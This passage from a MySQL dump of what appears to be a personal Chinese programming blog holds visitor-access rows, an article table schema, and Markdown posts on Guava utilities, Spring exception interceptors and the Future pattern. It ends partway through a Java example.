INSERT INTO `access` VALUES (362, '203.208.60.83', '2018-12-09 02:10:46');
INSERT INTO `access` VALUES (363, '203.208.60.58', '2018-12-09 12:21:57');
INSERT INTO `access` VALUES (364, '203.208.60.46', '2018-12-09 22:37:27');
INSERT INTO `access` VALUES (365, '203.208.60.116', '2018-12-10 15:01:35');
INSERT INTO `access` VALUES (366, '203.208.60.90', '2018-12-10 23:58:10');
INSERT INTO `access` VALUES (367, '203.208.60.118', '2018-12-10 04:57:43');
INSERT INTO `access` VALUES (368, '203.208.60.36', '2018-12-10 15:21:57');
INSERT INTO `access` VALUES (369, '203.208.60.115', '2018-12-10 09:59:19');
INSERT INTO `access` VALUES (370, '203.208.60.23', '2018-12-10 10:10:25');
INSERT INTO `access` VALUES (371, '203.208.60.19', '2018-12-10 15:52:12');
INSERT INTO `access` VALUES (372, '203.208.60.10', '2018-12-10 05:28:04');
INSERT INTO `access` VALUES (373, '207.246.102.139', '2018-12-11 20:31:23');
INSERT INTO `access` VALUES (374, '203.208.60.86', '2018-12-11 16:22:29');
INSERT INTO `access` VALUES (375, '203.208.60.58', '2018-12-11 19:26:23');
INSERT INTO `access` VALUES (376, '203.208.60.26', '2018-12-11 05:18:35');
INSERT INTO `access` VALUES (377, '203.208.60.78', '2018-12-11 01:19:07');
INSERT INTO `access` VALUES (378, '118.212.202.72', '2018-12-12 17:52:57');
INSERT INTO `access` VALUES (379, '207.246.102.139', '2018-12-12 19:15:32');
INSERT INTO `access` VALUES (380, '118.212.202.72', '2018-12-13 10:29:42');
INSERT INTO `access` VALUES (381, '203.208.60.18', '2018-12-13 01:39:09');
INSERT INTO `access` VALUES (382, '207.246.102.139', '2018-12-13 11:27:48');
INSERT INTO `access` VALUES (383, '118.212.202.72', '2018-12-14 20:38:24');
INSERT INTO `access` VALUES (384, '207.246.102.139', '2018-12-14 20:29:17');
INSERT INTO `access` VALUES (385, '207.246.102.139', '2018-12-15 19:29:35');
INSERT INTO `access` VALUES (386, '223.104.172.182', '2018-12-16 00:40:19');
INSERT INTO `access` VALUES (387, '203.208.60.47', '2018-12-17 08:19:07');
INSERT INTO `access` VALUES (388, '203.208.60.20', '2018-12-17 07:01:55');
INSERT INTO `access` VALUES (389, '111.206.198.108', '2018-12-17 14:51:08');
INSERT INTO `access` VALUES (390, '207.246.102.139', '2018-12-17 22:02:43');
INSERT INTO `access` VALUES (391, '223.104.172.66', '2018-12-17 01:06:23');
INSERT INTO `access` VALUES (392, '117.166.115.113', '2018-12-17 16:33:16');
INSERT INTO `access` VALUES (393, '183.45.172.149', '2018-12-18 09:05:06');
INSERT INTO `access` VALUES (394, '111.206.198.94', '2018-12-18 08:09:24');
INSERT INTO `access` VALUES (395, '39.178.44.155', '2018-12-18 23:52:07');
INSERT INTO `access` VALUES (396, '207.246.102.139', '2018-12-18 16:31:26');
INSERT INTO `access` VALUES (397, '203.208.60.98', '2018-12-19 18:23:41');
INSERT INTO `access` VALUES (398, '207.246.102.139', '2018-12-19 22:38:58');
INSERT INTO `access` VALUES (399, '203.208.60.60', '2018-12-20 17:28:07');
INSERT INTO `access` VALUES (400, '203.208.60.28', '2018-12-20 16:06:47');
INSERT INTO `access` VALUES (401, '111.206.221.83', '2018-12-20 22:10:05');
INSERT INTO `access` VALUES (402, '117.166.112.145', '2018-12-20 03:27:57');
INSERT INTO `access` VALUES (403, '207.246.102.139', '2018-12-20 19:53:36');
INSERT INTO `access` VALUES (404, '203.208.60.127', '2018-12-20 11:05:40');
INSERT INTO `access` VALUES (405, '203.208.60.67', '2018-12-20 15:21:10');
INSERT INTO `access` VALUES (406, '203.208.60.86', '2018-12-20 14:06:14');
INSERT INTO `access` VALUES (407, '203.208.60.15', '2018-12-20 21:03:02');
INSERT INTO `access` VALUES (408, '203.208.60.61', '2018-12-20 08:34:19');
INSERT INTO `access` VALUES (409, '203.208.60.78', '2018-12-20 22:57:30');
INSERT INTO `access` VALUES (410, '203.208.60.66', '2018-12-21 12:33:28');
INSERT INTO `access` VALUES (411, '203.208.60.21', '2018-12-21 07:21:42');
INSERT INTO `access` VALUES (412, '203.208.60.120', '2018-12-21 08:02:56');
INSERT INTO `access` VALUES (413, '111.206.198.48', '2018-12-21 15:52:54');
INSERT INTO `access` VALUES (414, '203.208.60.102', '2018-12-21 01:38:54');
INSERT INTO `access` VALUES (415, '203.208.60.48', '2018-12-21 10:43:17');
INSERT INTO `access` VALUES (416, '203.208.60.107', '2018-12-22 11:18:31');
INSERT INTO `access` VALUES (417, '203.208.60.88', '2018-12-22 22:57:23');
INSERT INTO `access` VALUES (418, '39.178.47.25', '2018-12-22 11:19:46');
INSERT INTO `access` VALUES (419, '111.206.221.22', '2018-12-22 05:13:22');
INSERT INTO `access` VALUES (420, '117.166.112.145', '2018-12-23 18:30:13');
INSERT INTO `access` VALUES (421, '111.206.198.101', '2018-12-23 14:39:24');
INSERT INTO `access` VALUES (422, '61.140.233.136', '2018-12-23 22:26:53');
INSERT INTO `access` VALUES (423, '203.208.60.87', '2018-12-23 06:11:39');
INSERT INTO `access` VALUES (424, '203.208.60.15', '2018-12-23 10:31:52');
INSERT INTO `access` VALUES (425, '42.237.237.244', '2018-12-23 11:50:42');
INSERT INTO `access` VALUES (426, '117.166.112.145', '2018-12-24 19:16:14');
INSERT INTO `access` VALUES (427, '111.206.221.43', '2018-12-24 07:09:48');
INSERT INTO `access` VALUES (428, '223.104.172.154', '2018-12-24 00:25:16');
INSERT INTO `access` VALUES (429, '117.166.112.145', '2018-12-25 12:19:46');
INSERT INTO `access` VALUES (430, '111.206.198.123', '2018-12-25 09:43:32');
INSERT INTO `access` VALUES (431, '207.246.102.139', '2018-12-25 15:23:07');
INSERT INTO `access` VALUES (432, '111.206.221.10', '2018-12-25 16:34:26');
INSERT INTO `access` VALUES (433, '207.246.102.139', '2018-12-26 15:30:40');
INSERT INTO `access` VALUES (434, '117.166.112.145', '2018-12-27 22:28:35');
INSERT INTO `access` VALUES (435, '203.208.60.119', '2018-12-27 09:19:51');
INSERT INTO `access` VALUES (436, '117.166.112.145', '2018-12-28 13:33:07');
INSERT INTO `access` VALUES (437, '207.246.102.139', '2018-12-28 19:19:59');
INSERT INTO `access` VALUES (438, '39.178.40.135', '2018-12-29 22:08:24');
INSERT INTO `access` VALUES (439, '117.166.112.145', '2018-12-29 10:45:13');
INSERT INTO `access` VALUES (440, '117.166.112.145', '2018-12-30 18:16:08');
INSERT INTO `access` VALUES (441, '117.166.112.145', '2018-12-31 12:47:34');
INSERT INTO `access` VALUES (442, '117.166.115.133', '2019-01-01 17:01:15');
INSERT INTO `access` VALUES (443, '111.206.221.34', '2019-01-01 07:27:23');
INSERT INTO `access` VALUES (444, '117.166.115.133', '2019-01-02 23:06:10');
INSERT INTO `access` VALUES (445, '39.178.42.155', '2019-01-02 00:37:00');
INSERT INTO `access` VALUES (446, '111.206.221.80', '2019-01-03 22:53:25');
INSERT INTO `access` VALUES (447, '207.246.102.139', '2019-01-03 22:42:28');
INSERT INTO `access` VALUES (448, '117.166.112.145', '2019-01-04 23:06:50');
INSERT INTO `access` VALUES (449, '207.246.102.139', '2019-01-04 22:58:24');
INSERT INTO `access` VALUES (450, '103.124.104.198', '2019-01-05 17:04:33');
INSERT INTO `access` VALUES (451, '195.123.240.253', '2019-01-05 19:47:51');
INSERT INTO `access` VALUES (452, '207.246.102.139', '2019-01-05 23:32:57');
INSERT INTO `access` VALUES (453, '194.156.229.85', '2019-01-05 17:20:24');
INSERT INTO `access` VALUES (454, '185.224.248.76', '2019-01-05 17:58:38');
INSERT INTO `access` VALUES (455, '207.246.102.139', '2019-01-06 12:49:48');
INSERT INTO `access` VALUES (456, '111.206.221.76', '2019-01-06 17:00:38');
INSERT INTO `access` VALUES (457, '39.178.43.44', '2019-01-06 17:49:47');
INSERT INTO `access` VALUES (458, '96.9.68.121', '2019-01-06 19:09:30');
INSERT INTO `access` VALUES (459, '111.206.198.24', '2019-01-06 08:00:37');
INSERT INTO `access` VALUES (460, '39.178.41.32', '2019-01-06 22:31:59');
INSERT INTO `access` VALUES (461, '218.65.5.212', '2019-01-07 13:11:19');
INSERT INTO `access` VALUES (462, '207.246.102.139', '2019-01-07 15:13:45');
INSERT INTO `access` VALUES (463, '207.246.102.139', '2019-01-08 16:22:06');
INSERT INTO `access` VALUES (464, '117.166.112.208', '2019-01-09 20:13:57');
INSERT INTO `access` VALUES (465, '207.246.102.139', '2019-01-09 17:42:10');
INSERT INTO `access` VALUES (466, '111.206.221.3', '2019-01-09 18:47:36');
INSERT INTO `access` VALUES (467, '59.53.29.158', '2019-01-10 16:44:43');
INSERT INTO `access` VALUES (468, '117.166.112.208', '2019-01-10 19:44:05');
INSERT INTO `access` VALUES (469, '39.169.230.162', '2019-01-10 22:47:36');
INSERT INTO `access` VALUES (470, '118.212.206.42', '2019-01-10 21:35:31');
INSERT INTO `access` VALUES (471, '117.166.112.208', '2019-01-11 15:17:41');
INSERT INTO `access` VALUES (472, '203.208.60.22', '2019-01-11 01:52:32');
INSERT INTO `access` VALUES (473, '118.212.210.1', '2019-01-11 22:56:35');
INSERT INTO `access` VALUES (474, '207.246.102.139', '2019-01-11 22:24:06');
INSERT INTO `access` VALUES (475, '203.208.60.69', '2019-01-12 20:41:04');
INSERT INTO `access` VALUES (476, '207.246.102.139', '2019-01-12 21:30:00');
INSERT INTO `access` VALUES (477, '203.208.60.91', '2019-01-12 06:41:54');
INSERT INTO `access` VALUES (478, '203.208.60.37', '2019-01-12 06:43:08');
INSERT INTO `access` VALUES (479, '203.208.60.125', '2019-01-12 06:45:04');
INSERT INTO `access` VALUES (480, '223.104.172.52', '2019-01-12 11:46:09');
INSERT INTO `access` VALUES (481, '118.212.204.124', '2019-01-12 22:24:28');
INSERT INTO `access` VALUES (482, '203.208.60.97', '2019-01-12 00:42:55');
INSERT INTO `access` VALUES (483, '203.208.60.66', '2019-01-12 17:01:24');
INSERT INTO `access` VALUES (484, '207.246.102.139', '2019-01-13 18:01:30');
INSERT INTO `access` VALUES (485, '59.173.231.10', '2019-01-14 19:16:33');
INSERT INTO `access` VALUES (486, '203.208.60.33', '2019-01-14 04:27:36');
INSERT INTO `access` VALUES (487, '39.169.230.252', '2019-01-14 21:25:21');
INSERT INTO `access` VALUES (488, '59.173.231.10', '2019-01-15 15:40:41');
INSERT INTO `access` VALUES (489, '103.40.221.101', '2019-01-15 22:58:07');
INSERT INTO `access` VALUES (490, '117.166.112.214', '2019-01-15 22:17:14');
INSERT INTO `access` VALUES (491, '203.208.60.23', '2019-01-16 21:06:12');
INSERT INTO `access` VALUES (492, '207.246.102.139', '2019-01-16 20:31:55');
INSERT INTO `access` VALUES (493, '115.191.218.237', '2019-01-16 00:49:26');
INSERT INTO `access` VALUES (494, '59.53.18.205', '2019-01-16 16:41:35');
INSERT INTO `access` VALUES (495, '218.64.60.78', '2019-01-17 17:17:22');
INSERT INTO `access` VALUES (496, '117.166.112.214', '2019-01-17 23:26:37');
INSERT INTO `access` VALUES (497, '118.212.204.195', '2019-01-18 10:27:34');
INSERT INTO `access` VALUES (498, '117.170.206.23', '2019-01-18 15:40:14');
INSERT INTO `access` VALUES (499, '203.208.60.22', '2019-01-18 04:02:23');
INSERT INTO `access` VALUES (500, '203.208.60.51', '2019-01-18 07:21:24');
INSERT INTO `access` VALUES (501, '117.170.206.23', '2019-01-19 19:58:22');
INSERT INTO `access` VALUES (502, '203.208.60.28', '2019-01-19 17:10:07');
INSERT INTO `access` VALUES (503, '117.166.115.61', '2019-01-20 20:55:26');
INSERT INTO `access` VALUES (504, '203.208.60.67', '2019-01-20 12:45:02');
INSERT INTO `access` VALUES (505, '203.208.60.47', '2019-01-21 03:49:47');
INSERT INTO `access` VALUES (506, '203.208.60.45', '2019-01-21 14:43:10');
INSERT INTO `access` VALUES (507, '203.208.60.55', '2019-01-21 00:10:18');
INSERT INTO `access` VALUES (508, '207.246.102.139', '2019-01-21 20:55:12');
INSERT INTO `access` VALUES (509, '203.208.60.118', '2019-01-22 23:33:13');
INSERT INTO `access` VALUES (510, '203.208.60.52', '2019-01-22 11:19:00');
INSERT INTO `access` VALUES (511, '203.208.60.76', '2019-01-22 23:03:01');
INSERT INTO `access` VALUES (512, '203.208.60.24', '2019-01-22 10:58:57');
INSERT INTO `access` VALUES (513, '203.208.60.81', '2019-01-22 20:21:55');
INSERT INTO `access` VALUES (514, '203.208.60.53', '2019-01-22 17:31:49');
INSERT INTO `access` VALUES (515, '59.52.37.206', '2019-01-22 14:28:25');
INSERT INTO `access` VALUES (516, '111.206.198.22', '2019-01-23 05:55:52');
INSERT INTO `access` VALUES (517, '203.208.60.5', '2019-01-23 06:56:39');
INSERT INTO `access` VALUES (518, '203.208.60.91', '2019-01-23 10:37:52');
INSERT INTO `access` VALUES (519, '61.131.202.173', '2019-01-23 15:09:41');
INSERT INTO `access` VALUES (520, '203.208.60.52', '2019-01-23 15:39:18');
INSERT INTO `access` VALUES (521, '203.208.60.51', '2019-01-24 16:47:14');
INSERT INTO `access` VALUES (522, '61.131.202.173', '2019-01-24 11:12:21');
INSERT INTO `access` VALUES (523, '203.208.60.32', '2019-01-25 08:05:10');
INSERT INTO `access` VALUES (524, '207.246.102.139', '2019-01-25 23:42:01');
INSERT INTO `access` VALUES (525, '203.208.60.44', '2019-01-25 04:22:21');
INSERT INTO `access` VALUES (526, '117.166.112.198', '2019-01-25 21:01:45');
INSERT INTO `access` VALUES (527, '203.208.60.110', '2019-01-25 12:36:13');
INSERT INTO `access` VALUES (528, '118.212.211.161', '2019-01-25 17:56:57');
INSERT INTO `access` VALUES (529, '182.86.73.197', '2019-01-25 19:45:34');
INSERT INTO `access` VALUES (530, '203.208.60.75', '2019-01-26 11:40:20');
INSERT INTO `access` VALUES (531, '203.208.60.122', '2019-01-26 13:55:36');
INSERT INTO `access` VALUES (532, '203.208.60.43', '2019-01-27 06:00:09');
INSERT INTO `access` VALUES (533, '203.208.60.37', '2019-01-28 05:20:19');
INSERT INTO `access` VALUES (534, '203.208.60.62', '2019-01-28 06:01:15');
INSERT INTO `access` VALUES (535, '117.40.113.124', '2019-01-29 16:37:43');
INSERT INTO `access` VALUES (536, '203.208.60.43', '2019-01-29 04:59:32');
INSERT INTO `access` VALUES (537, '203.208.60.116', '2019-01-30 11:03:42');
INSERT INTO `access` VALUES (538, '203.208.60.39', '2019-01-30 23:30:48');
INSERT INTO `access` VALUES (539, '115.148.152.121', '2019-01-31 09:46:30');
INSERT INTO `access` VALUES (540, '203.208.60.90', '2019-02-01 06:22:50');
INSERT INTO `access` VALUES (541, '59.52.178.119', '2019-02-02 13:35:20');
INSERT INTO `access` VALUES (542, '203.208.60.110', '2019-02-03 17:40:35');
INSERT INTO `access` VALUES (543, '203.208.60.102', '2019-02-03 05:02:18');
INSERT INTO `access` VALUES (544, '203.208.60.66', '2019-02-04 14:41:09');
INSERT INTO `access` VALUES (545, '203.208.60.111', '2019-02-04 03:38:04');
INSERT INTO `access` VALUES (546, '203.208.60.26', '2019-02-04 15:09:58');
INSERT INTO `access` VALUES (547, '203.208.60.118', '2019-02-04 16:39:56');
INSERT INTO `access` VALUES (548, '203.208.60.46', '2019-02-06 01:06:14');
INSERT INTO `access` VALUES (549, '103.40.221.101', '2019-02-07 08:51:09');
INSERT INTO `access` VALUES (550, '203.208.60.21', '2019-02-08 18:56:58');
INSERT INTO `access` VALUES (551, '203.208.60.99', '2019-02-08 07:39:31');
INSERT INTO `access` VALUES (552, '176.54.52.80', '2019-02-08 02:51:23');
INSERT INTO `access` VALUES (553, '', '2019-02-25 08:22:34');
INSERT INTO `access` VALUES (554, '66.249.79.254', '2019-02-26 10:32:24');
INSERT INTO `access` VALUES (555, '66.249.66.2', '2019-03-02 15:18:30');
INSERT INTO `access` VALUES (556, '66.249.66.4', '2019-03-02 13:46:25');
INSERT INTO `access` VALUES (557, '66.249.66.31', '2019-03-02 13:50:02');
INSERT INTO `access` VALUES (558, '66.249.73.195', '2019-03-10 16:00:10');
INSERT INTO `access` VALUES (559, '66.249.73.193', '2019-03-10 16:00:09');

-- ----------------------------
-- Table structure for article
-- ----------------------------
DROP TABLE IF EXISTS `article`;
CREATE TABLE `article`  (
  `id` int(0) UNSIGNED NOT NULL AUTO_INCREMENT COMMENT '文章主键id',
  `user_id` int(0) NOT NULL COMMENT '文章属于的前台用户id',
  `title` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '文章的标题',
  `face_cover` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '文章的封面',
  `content` text CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '文章的内容,存放markdown内容',
  `praise` int(0) NOT NULL DEFAULT 0 COMMENT '文章的网络点赞数,游客也可以点赞',
  `comment_sum` int(0) NOT NULL DEFAULT 0 COMMENT '文章评论数量,用户评论后由消息队列进行更新',
  `browse_sum` int(0) NOT NULL DEFAULT 0 COMMENT '文章访问数量,查看文章后由消息队列进行更新',
  `status` int(0) NOT NULL DEFAULT 0 COMMENT '文章状态.0:可用,1:被删除',
  `weight` int(0) NOT NULL DEFAULT 0 COMMENT '文章的权重,用于排序',
  `create_time` datetime(0) NOT NULL DEFAULT CURRENT_TIMESTAMP(0) COMMENT '创建文章的时间',
  `update_time` datetime(0) NOT NULL DEFAULT CURRENT_TIMESTAMP(0) COMMENT '更新文章的时间',
  `approval` int(0) NOT NULL DEFAULT 0 COMMENT '文章的赞数',
  `oppose` int(0) NOT NULL DEFAULT 0 COMMENT '文章的踩数',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 123 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '文章的数据表' ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of article
-- ----------------------------
INSERT INTO `article` VALUES (1, 1, '留言', '2018/8/1533868132_aac3042b2ef298ea9be94be9caea6a8d.jpg', '# 留言\n如果你有什么要对我说的，可以在这里进行留言或者联系我\n\n留言板及友链申请页面暂未制作', 9, 6, 517, 0, 0, '2018-08-10 10:31:18', '2019-10-28 17:32:46', 0, 0);
INSERT INTO `article` VALUES (2, 1, 'gauva常用的一些字符串和集合方法', '2018/8/1533873011_fdca7053ee1dd61cb49be519daa2f874.jpg', '## gauva是什么\ngauva是谷歌的一款非常好用的开源工具库，提供了许多实用方法操作集合,字符串处理,io等  \n分享一些常用的方法使用\n## 字符串处理\n### 数组拼接\nStrings是一个用来判断字符串的类,和apache的lang3包差不多\n```java\nString str = null\n// 如果是null返回空串\nString emptyStr = Strings.nullToEmpty(str)\n// 是否是null或者是空串 \nStrings.isNullOrEmpty(str) \n```\nJoiner.on是一个可以帮助我们把字符串数组进行拼接的方法 \n比如下面的例子 \n```java\nString[] arr = {\"a\",\"b\",\"c\",\"d\"};\nString j = Joiner.on(\".\").join(arr)\nSystem.out.println(j); // \"a.b.c.d\"\n```\n***\n### 请求参数拼接 \n当前端传来一串id数字字符串进行批量修改或者删除,像这样\n```javascript\nvar ids = \"64,65,89,64,74\": // 多选框选中后拼接的id字符串\n```\n后端接收后需要把它进行拆解,用Splitter.on方法\n```java\nString ids = \"64,65,89,64,74\";\nList<Integer> idsList = Splitter.on(\",\").trimResults().omitEmptryStrings().splitToList(ids)\n// 变回原来的\nids = String.join(\",\",idsList);\n```\n***\n拼接url地址query参数?a=1&b=2&c=3\n```java\nMap map = Maps.newHashMap();\nmap.put(\"a\",\"1\")\nmap.put(\"b\",\"2\")\nmap.put(\"c\",\"3\")\nString m = Joiner.on(\"&\")\n.useForNull(\"\")\n.withKeyValueSeparator(\"=\")\n.join(map);\nSystem.out.println(m);	// a=1&b=2&c=3\n```\n*** \n## 操作集合\n### 创建集合\nguava可以使我们快速创建集合\n```java\nList list = Lists.newArrayList(); // 相当于new\nMap map =  Maps.newHashMap();\n// 有一个方法需要一个list \nneedListMethod(Lists.newArrayList(\"arg1\",\"arg2\")) \n// 有一个方法需要一个map\nneedMapMethod(ImmutableMap.of(\"a\",\"1\",\"b\",\"2\"))\n```\n*** \n### MultiMap\nMultimap是一个非常好用的Map结构，常用于树结构的存储\n```\nList<TreeLevelDto> data= getData();\n// 相当于一个Map<String,List<TreeLevelDto>> \nMultimap<String, TreeLevelDto> map = ArrayListMultimap.create();\ndata.forEach(item -> {\n    // 将相同等级的数据放在一起\n    map.put(item.getLevel(),item)\n})  \n// 递归树结构时只需要根据等级就能取出该等级的数据\nmap.get(item.getNextLevel())\n```\n## 单机缓存\nguava有一个很好用的单机缓存,速度很快  \n```java\n// 有很多功能 \nprivate Cache<String, UserInfo> userInfoCache =\n      CacheBuilder.newBuilder().expireAfterWrite(20, TimeUnit.MINUTES).build(); \n// 取出缓存,不存在会返回空 \nUserInfo userInfo = userInfoCache.getIfPresent(tokenInfo.getToken());\n// 存入 \nuserInfoCache.put(tokenInfo.getToken(), userInfo);\n// 清除\nuserInfoCache.invalidate(tokenInfo.getToken());\n```\n## 限流  \nguava内有个一个很好用的令牌桶限流的实现  \n##### 所谓令牌桶算法,就是每隔一段时间在一个集合里生成一定数量的令牌,只有拿到了令牌的请求才允许通过,这样可以限制高并发的请求数量\n```java\n// 创建一个令牌桶,每秒生成100个令牌\nprivate static final RateLimiter RATE_LIMITER = RateLimiter.create(100);\n\n// 尝试从令牌桶里获取一个令牌\nif (!RATE_LIMITER.tryAcquire()) {\n	throw new RateException(\"没抢到令牌,稍后再试\");\n}\nreturn true;\n```', 0, 0, 71, 0, 0, '2018-08-10 11:50:55', '2019-02-22 00:02:38', 0, 0);
INSERT INTO `article` VALUES (3, 1, 'Spring各种异常拦截器的使用', '2018/8/1533878493_d6b979fdf32e3984dba5bea2555a9c43.jpg', '# 前言\nSpring的异常的拦截器有许多种,本文仅仅举例出常用异常拦截器\n## 异常拦截器是什么\n1. 一般在开发web应用时常常会分为设计模块,比如Mvc,Mvp,WebFlux等  \n2. 一个逻辑模块(mvc的service层)中出现参数校验不正确,资源找不到等异常信息时。\n3. 我们需要给客户端返回一个错误码和错误信息,在返回的途中，我们不可能直接把错误码返回给接口(controller)层，这会使代码变得臃肿且冗余量大。 \n4. 接口层仅仅只负责接收请求而不做过多的逻辑处理,像下面这样错误的例子\n\n```java\n// Controller层\n// 上传文件并返回文件路径\n@PostMapping(value=\"/uploadFile\", headers=\"content-type=multipart/form-data\")\npublic JsonResult<String> upload(@RequestParam(value = \"file\") MultipartFile file) {\n	return imgService.upload(file);\n}\n// Service层\npublic JsonResult<String> upload(MultipartFile file) {\n    if (file.isEmptry()) {\n		// 文件为空返回错误码和错误信息\n		// 这是lombok中的实现建造者模式快速创建对象的方式，添加lombok注解即可\n		return JsonResult.<String>builder().code(\"303\").msg(\"文件为空\").build();\n    }\n    String url = fileService.upload(file);\n	// 文件上传成功后返回路径\n	return  JsonResult.<String>builder().code(200).result(url).msg(\"上传成功\").build();\n}\n```\n上面的代码看上去好像没有问题，可以正常执行，但是有严重的问题。\n1. 冗余量大,每次发生错误时都需要返回一个数据对象,如果校验多参数会显得特别麻烦\n2. 返回结构太固定，出现不同的异常时，很可能返回的结果形式不同，而不能单单局限于一种返回对象 \n3. 无法统一管理错误日志，service层不适合记录日志，这里的逻辑太多，大量在这里记录错误日志会使得代码非常臃肿\n\n## 异常拦截器的使用\n### 抛出异常\n由于以上问题，异常拦截器就派上用场了  \n我们把之前的service代码改造一下\n```java\npublic JsonResult<String> upload(MultipartFile file) {\n    if (file.isEmptry()) {\n		// 在这里抛出一个异常，接收状态码和错误信息\n		// 这里的状态码建议统一配置，便于修改和管理 \n		throw new FileUploadException(303,\"上传失败，文件为空\");\n    }\n    String url = fileService.upload(file);\n	// 文件上传成功后返回路径\n	return  JsonResult.<String>builder().code(200).result(url).msg(\"上传成功\").build(); \n}\n```\n### 自定义异常\n上面的代码我们将发生异常时需要返回的对象去除，换成了抛出一个异常，这个异常当然要我们自己去定义\n```java\n// 定义我们自己要抛出的异常\n// 记得继承RunTimeException才行，Spring事务不修改配置只会回滚RunTimeException类及子类的异常\n// 这里我们实现自己定义的一个接口，我们自定义的异常都实现这个接口，便于管理\n// Java是支持继承多接口的，所以不用担心无法继承其他接口\npublic class FileUploadException extends RunTimeException implement MyWebException {\n	// 状态码\n	private int ResultCode;\n	// 错误信息\n	private String msg;\n	// 一个接收参数的构造\n	public FileUploadException(int ResultCode,String msg) {\n		this.ResultCode = ResultCode;\n		this.msg = msg;\n	}\n}\n```\n### 自定义异常拦截器\n异常定义好了，我们当然要抓住这个被抛出的异常了  \n我们开始定义异常拦截器\n```java\n// 这是一个Spring扫描的注解,意思是这是一个切面管理类\n@ControllerAdvice\npublic class ExcepitonAdvice {\n	// 我们要抓住哪个异常\n	// 返回值是Spring提供的一个response包装后的对象\n	@ExceptionHandler(FileUploadException.class)\n	public ResponseEntity<FileUploadExceptionResult> handlerFileUploadException(FileUploadException e) {\n		// 在这里记录错误日志\n		logger.err(e.getMsg(),e)\n		// 返回这个response包装对象，第一个参数是我们的返回数据对象，第二个是http的返回状态码\n		return new ResponseEntity<FileUploadExceptionResult>（\n				new FileUploadExceptionResult(e.getResultCode().e.getMsg(),\n					HttpStatus.OK);\n	}\n}\n```\n### 自定义返回对象\n当我们自己定义的异常被上面的代码捕获时，会返回ResponseEntitry这个对象，第一个参数的返回对象需要我们自己定义,第二个参数用HttpStatus这个枚举类中的状态码即可\n```java\n// 当发生文传失败时返回的数据对象\npublic class FileUploadExceptionResult {\n	private int code;\n	private String msg;\n	public FileUploadException(int code,String msg) {\n		this.code = code;\n		this.msg = msg;\n	}\n}\n```\n### 结果\n走一遍异常流程，当文件为空时，会抛出FileUploadException这个我们自己定义的异常，随后它会被我们的异常拦截器捕获，返回一个包装对象给页面,第一个参数就是我们错误后返回的数据对象\n1. 这样当我们出现错误时只要抛出异常就行了，而不必返回对象给Controller层\n2. 异常拦截器中我们可以统一记录错误日志\n3. 每种异常出现后我们可以选择不同返回对象格式进行返回\n\n## 其他的异常拦截器\n当然异常拦截器的定义不止这仅仅一种，还有多种定义拦截器的方法  \n### 返回jsp或freemarker等模板页面的异常拦截器\n```java\n// 捕获异常后返回页面的异常拦截器\npublic class JspExceptionResolve implements HanderExceptionResolver {\n	public ModelAndView resolveException(HttpServletRequest request,  \n					HttpServletResponse response,Object handler,Exception e) {\n		if (e instantof FileUploadException ) {\n			FileUploadExeption fe = (FileUploadException)e;\n			// 返回页面和错误信息\n			Map map = new Map()\n			map.put(fe.getMsg()\n			return new MOdelAndView(\"404\",map)\n		}\n	}\n}\n```\n### 不使用ResponseEntity的异常拦截器\n```java\npulibc class MyExceptionHander {\n	// 返回状态吗,需要捕获的异常，返回格式\n	@ResponseStatus(HttpStatus.OK)\n	@ExceptionHanlder(FileUploadException.class)\n	@ResponseBody\n	public MyResult handlerFileUploadException(HttpServeltRequest req,FileUploadException e) {\n		logger.erro(e.getMsg(),e)\n		// 返回你自己定义的返回数据对象\n		return new MyResult(e.getCode(),e.getMsg())\n	}\n}\n\n```\n除此之外还有一些异常拦截器的定义，想要知道更多请查找其他资料或文章教程', 0, 0, 61, 0, 0, '2018-08-10 13:21:44', '2019-02-22 00:03:21', 0, 0);
INSERT INTO `article` VALUES (4, 1, 'Future模式概念原理与实现', '2018/8/1533889958_aa382776591767b5886a3016efa33ed0.jpg', '### 什么是Future模式\n1. FutureA和B两个线程,如果A需要B的执行结果,那么这个A线程不需要等待B执行完毕就能拿到结果\n2. Future模式简单的理解就是类似于前端的ajax\n4. *Future模式的核心在于,去除主函数的等待时间,并使得原本需要等待的时间段可以用于处理其他业务逻辑*\n5. 提高效率,而不在阻塞上浪费资源\n\n#### 应用场景\n1. 桌面/移动应用程序: 下载软件,使用子线程进行下载,使整个程序不会阻塞\n2. 浏览器前端: ajax请求,利用事件轮询异步机制来达成类似子线程请求的过程,使整个程序不会阻塞\n3. 服务端: 子任务处理,利用callable/fork/join等来达成拆分子任务提高效率,使整个应用程序不会阻塞\n\n##### 需要了解前端ajax和Java后端的callable\n### 前端ajax\n```javascript\nconsole.log(\'main1\')\n// 正常同步情况下,那么一定会等待$.ajax执行完毕\n$.ajax(\'/user/get\',{\n	data: JSON.stringify(data1),\n	dataType:\'json\',\n	type:\'post\',\n	timeout:10000,\n	headers:{\'Content-Type\':\'application/json;charset=utf-8\'},\n	success: function(data) {\n		// 异步轮询回调\n		console.log(\'child\')\n		return data\n	}) \n// 因为ajax是异步所以并不会等待$.ajax回调结果,就已经先走到了这里\nconsole.log(\'main2\')\n```\n#### 前端的future模式\n1. 前端js执行引擎并没有多线程概念\n2. 前端js单线程-只有一个线程\n3. 前端采用了setTimeout和ajax实现future模式\n4. 依靠event-loop事件轮询机制来解决\n5. ajax看似多线程实际依靠事件轮询来完成\n\n#### 什么是event-loop\n1. 事件轮询,JS实现异步的具体解决方案\n2. 同步代码,直接执行\n3. 异步函数先放在*异步队列*中\n4. 待同步函数执行完毕,轮询执行*异步队列*的函数\n\n#### 为什么前端js是单线程\n- 避免DOM渲染冲突,浏览器需要渲染DOM\n- JS可以修改DOM结构\n- JS执行的时候,浏览器DOM渲染会暂停\n- 两段JS也不能同时执行(都修改DOM就冲突了)\n- webworker支持多线程,但不能访问DOM\n\n#### 前端js有哪些异步解决方案\n1. promise\n2. co\n3. async/await\n\n##### 但是,改变不了JS单线程,异步的本质\n\n### Java的Callable\n```java\n@Slf4j\npublic class FutureTaskExample {\n    public static void main(String[] args) throws Exception{\n        FutureTask<String> futureTask = new FutureTask<String>(new Callable<String>() {\n            @Override\n            public String call() throws Exception {\n                log.info(\"子线程去下载图片\");\n                Thread.sleep(5000);\n                return \"data\";\n            }\n        });\n        new Thread(futureTask).start();\n        